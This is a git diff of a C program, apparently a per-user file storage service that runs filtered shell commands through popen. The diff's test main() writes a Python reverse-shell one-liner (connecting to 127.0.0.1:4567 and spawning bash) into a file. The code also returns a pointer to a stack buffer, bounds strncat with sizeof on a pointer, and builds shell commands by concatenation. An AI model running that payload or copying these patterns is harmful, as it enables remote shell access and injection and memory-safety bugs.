@@ -7,7 +7,7 @@
 
 
 // function prototypes
-int execute_command(char* command);
+char* execute_command(char* command);
 char* get_file(char* filename);
 int execute_command_from_file(char* filename);
 int traversal(char* filename);
@@ -36,7 +36,6 @@ int traversal(char* filename){
 // Allocates a folder for the user.
 int create_storage(char* user){
 	int go = traversal(user);
-	printf("%d", go);
 	if(go == 1 || go == -1){
 		return 0;
 	}
@@ -55,7 +54,7 @@ int is_user(char* user){
 		return -1;
 	}
 
-	printf("Directory: %s",user);
+	printf("Directory: %s\n", user);
 	if (stat(user, &st) == -1) {
 		return 0;
 	}
@@ -91,42 +90,48 @@ int switch_location(char* user){
 }
 
 // executes a command on the OS
-int execute_command(char* command){
+char* execute_command(char* command){
 
-	// could bring the stream, and send piece by piece to the user?
+	strtok(command, "\n"); // fix the commands input
+
 	int go = input_validation_command(command);
 	if(go == 0){
-		return 0;
+		return "Invalid Commond for limited set.";
 	}
 
 	// setting up the shell command for the users folder.
 	// 'cd directory_name && command';
-	char *result = malloc(strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1);
-	strcpy(result,"cd ");
-	strcat(result, directory);
-	strcat(result, " && ");
-	strcat(result, command);
+	int result_size = strlen(command) + strlen("cd && ") + strlen(directory) + 1;
+	char *result = malloc(result_size);
 
-    char buf[500];
+	strncpy(result,"cd ", result_size);
+	strncat(result, directory, result_size);
+	strncat(result, " && ", result_size);
+	strncat(result, command, result_size);
+
+    char buf[1000];
     FILE *fp;
     if ((fp = popen(result, "r")) == NULL) {
         printf("Error opening pipe!\n");
 		free(result);
-        return -1;
+        return "Error with command...";
     }
 
-    while (fgets(buf, 500, fp) != NULL) {
-        // send the stream here? I guess that works... Lol
-        printf("OUTPUT: %s", buf);
+	// get the output from the command
+	int output_size = 1000;
+	char output[output_size];
+	strncpy(output,"", output_size);
+    while (fgets(buf, output_size, fp) != NULL) {
+        strncat(output, buf, output_size);
     }
 
+	// need to find a graceful way to handle errors... Right now, it just crashes I think.
 	free(result);
     if(pclose(fp))  {
-        printf("Command not found or exited with error status\n");
-        return -1;
+        return "Error with command...";
     }
-
-	return 1;
+	char* output_res = output;
+	return output_res;
 }
 
 // executes commands on the OS from a file
@@ -141,11 +146,12 @@ int execute_command_from_file(char* filename){
 
 	// setting up the full shell command.
 	// 'cd directory_name && command';
-	char *result = malloc(strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1);
-	strcpy(result,"cd ");
-	strcat(result, directory);
-	strcat(result, " && ");
-	strcat(result, command); // the cd .. is not needed because the program goes back after the execution of the code.
+	int result_size = strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1;
+	char *result = malloc(result_size);
+	strncpy(result,"cd ", 3);
+	strncat(result, directory,result_size);
+	strncat(result, " && ", result_size);
+	strncat(result, command, result_size); // the cd .. is not needed because the program goes back after the execution of the code.
 
 	//executes the command
     if ((fp = popen(result, "r")) == NULL) {
@@ -177,10 +183,11 @@ int store_file(char* filename, char* text){
 	}
 
 	// creates a file with the name user_directory/filename
-	char *file_spot = malloc(strlen(filename) + strlen(directory) + 1);
-	strcpy(file_spot, directory);
-	strcat(file_spot, "/");
-	strcat(file_spot, filename);
+	int file_spot_size = strlen(filename) + strlen(directory) + 1;
+	char *file_spot = malloc(file_spot_size);
+	strncpy(file_spot, directory, file_spot_size);
+	strncat(file_spot, "/", file_spot_size);
+	strncat(file_spot, filename, file_spot_size);
 
 	FILE *f = fopen(file_spot, "w"); // attempts to open a file
 	if (f == NULL)
@@ -255,52 +262,32 @@ int input_validation_command(char* command){
 
 char* get_location(char* filename){
 	char *file_spot = malloc(strlen(directory) + strlen(filename) + 2);
-	strcpy(file_spot, directory);
-	strcat(file_spot, "/");
-	strcat(file_spot, filename);
+	strncpy(file_spot, directory, sizeof(file_spot));
+	strncat(file_spot, "/", sizeof(file_spot));
+	strncat(file_spot, filename, sizeof(file_spot));
 	return file_spot;
 }
 
-// int main(){
-// 	char command[] = "ls ";
-//
-// 	// Server side of things... Will have a CLI to view options!
-// 	switch_location("Max");
-// 	// store_file("Max/hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
-//
-// 	//
-// 	// execute_command(command);
-//
-// 	char hex[010];
-// 	execute_command_from_file("hack.me");
-// 	//create_storage("Max");
-// 	// printf("%d", switch_location("Max"));
-// 	return 0;
-// }
+int main(){
+	char command[] = "file hack.me";
+
+	// Server side of things... Will have a CLI to view options!
+	switch_location("Max");
+	store_file("Max/hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
+
+	//
+	char* max = execute_command(command);
+	printf("%s\n" ,max);
+
+}
 
 /*
 All of this is per user! So, do we need a login, to access your section? I think this probably works the best!
 Options:
-Upload a file...
+Upload a file.
 Open file:
 - What to do:
-	- Overwrite,
-	- Edit,
 	- Execute
-Run OS commands... malicous!
-*/
-
-/*
-Ask if new user or old user.
-- If new user, then create a directory.
-- If old user, just switch directories.
-	- Could have actual login stuff?
-
-From there:
-- Upload a file.
-- Open file- once opened
-	- Overwrite
-	- View
-	- Execute file
-- Run commands on file: Choose from ls, stat, file and ...
+	- Retrieve
+Run OS commands, that are filtered.
 */
